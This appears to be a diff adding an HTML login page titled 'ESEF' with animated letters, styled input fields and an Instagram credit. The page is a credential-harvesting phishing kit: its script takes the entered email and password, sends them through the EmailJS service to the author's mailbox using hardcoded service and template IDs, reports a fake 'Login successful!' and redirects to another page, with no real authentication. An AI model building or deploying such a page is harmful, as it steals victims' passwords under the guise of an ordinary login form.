@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Title ESEF */
+        h1 {
+            font-size: 6em;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+            position: relative;
+            font-weight: bold;
+        }
+
+        h1 span {
+            display: inline-block;
+            font-size: 5em;
+            font-family: 'Courier', monospace;
+            animation: moveDown 2s infinite, colorChange 2s infinite;
+            position: relative;
+        }
+
+        h1 span:nth-child(1) { animation-delay: 0s, 0s; }
+        h1 span:nth-child(2) { animation-delay: 0.5s, 0s; }
+        h1 span:nth-child(3) { animation-delay: 1s, 0s; }
+        h1 span:nth-child(4) { animation-delay: 1.5s, 0s; }
+
+        @keyframes moveDown {
+            0% { transform: translateY(-30px); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(30px); opacity: 0; }
+        }
+
+        @keyframes colorChange {
+            0% { color: #FF6347; }
+            25% { color: #FFD700; }
+            50% { color: #32CD32; }
+            75% { color: #1E90FF; }
+            100% { color: #FF6347; }
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-size: 1em;
+            border: 2px solid;
+            background-color: #fff;
+            color: black;
+            transition: all 0.3s ease;
+        }
+
+        .login-container input.email { border-color: #1e90ff; box-shadow: 0 0 10px #1e90ff; }
+        .login-container input.password { border-color: #FFD700; box-shadow: 0 0 10px #FFD700; }
+
+        .login-container input:focus { outline: none; }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            transition: all 0.3s;
+        }
+
+        .login-container button:hover {
+            transform: scale(1.1);
+            background-color: #32CD32;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 1em;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #333;
+            margin-left: 10px;
+            font-size: 0.9em;
+        }
+
+        .footer a:hover { color: #1E90FF; }
+
+        .footer .instagram-icon {
+            width: 20px;
+            height: 20px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png');
+            background-size: cover;
+            display: inline-block;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>
+        <span>E</span>
+        <span>S</span>
+        <span>E</span>
+        <span>F</span>
+    </h1>
+
+    <div class="login-container">
+        <h2 style="color: #1E90FF;">Login</h2>
+        <input type="email" id="email" class="email" placeholder="Email Address">
+        <input type="password" id="password" class="password" placeholder="Password">
+        <button onclick="sendData()">Log In</button>
+    </div>
+
+    <div class="footer">
+        <span>BY</span>
+        <a href="https://www.instagram.com/jamaa33_34?igsh=MThiMWhrczdoMmM5aw==" target="_blank">
+            <span class="instagram-icon"></span> Instagram
+        </a>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("XIIhFKL8RgGIvBRNf"); // استبدل بـ Public Key الخاص بك
+        })();
+
+        function sendData() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            if (email === "" || password === "") {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            var templateParams = {
+                email: email,
+                password: password
+            };
+
+            emailjs.send("service_v58ggeb", "template_i5pdf7a", templateParams)
+                .then(function(response) {
+                    alert("Login successful!");
+
+                    // الانتقال إلى صفحة جديدة (مثلاً dashboard.html)
+                    window.location.href = "hh.html"; // استبدل باسم الملف الخارجي
+                }, function(error) {
+                    alert("Error: " + error.text);
+                });
+        }
+    </script>
+</body>
+</html>
